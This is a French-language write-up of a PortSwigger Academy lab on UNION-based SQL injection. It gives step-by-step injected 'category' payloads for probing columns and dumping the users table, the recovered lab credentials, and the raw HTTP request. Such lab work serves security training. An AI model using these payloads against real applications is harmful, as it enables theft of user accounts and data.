# 💉 Lab : SQL injection UNION attack, retrieving data from other tables
**Catégorie :** Injection SQL (SQLi)
**Type :** UNION-Based SQLi (Exfiltration Massive / Data Breach)
**Plateforme :** PortSwigger Web Security Academy

---

## 📌 Résumé de la Vulnérabilité
L'application web est vulnérable à une injection SQL dans le paramètre de filtrage des catégories. En utilisant une attaque UNION, il est possible de contourner l'isolement des données et d'exfiltrer des informations critiques provenant d'autres tables (ici, la table `users`). 

## 🛠️ Preuve de Concept (PoC)
L'exploitation a été réalisée en identifiant la structure de la requête originale, puis en extrayant l'intégralité des comptes utilisateurs.

1. **Détermination du nombre de colonnes :** 
   - `category=Gifts' UNION SELECT NULL--` -> **Erreur 500**
   - `category=Gifts' UNION SELECT NULL,NULL--` -> **200 OK** (La requête utilise 2 colonnes).

2. **Vérification de la compatibilité des types de données :**
   - `category=Gifts' UNION SELECT 'a',NULL--` -> **200 OK**
   - `category=Gifts' UNION SELECT NULL,'a'--` -> **200 OK**
   *(Les deux colonnes acceptent le type texte/string).*

3. **Exfiltration massive des identifiants (Data Breach) :**
   L'absence de clause de restriction (`WHERE`) dans la charge utile a permis d'aspirer la totalité de la table `users`.
   - **Payload :** `category=Gifts' UNION SELECT username,password FROM users--`

4. **Résultat de la compromission :**
   Les identifiants et mots de passe de tous les utilisateurs inscrits ont été exposés en clair dans le code HTML de la page web :
   - `administrator` : `3tgkp63ndvih860st98a`
   - `carlos` : `zq6xtefrgu9mwgekavr8`
   - `wiener` : `9q5wyoiej90p2600h1yf`

```http
GET /filter?category=Gifts' UNION SELECT username,password FROM users-- HTTP/2
Host: 0a390095037195f1828334c7001e0052.web-security-academy.net
Cookie: session=poimLpUQUxkwIKm01HCeMy1p3DYARlrq
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a390095037195f1828334c7001e0052.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
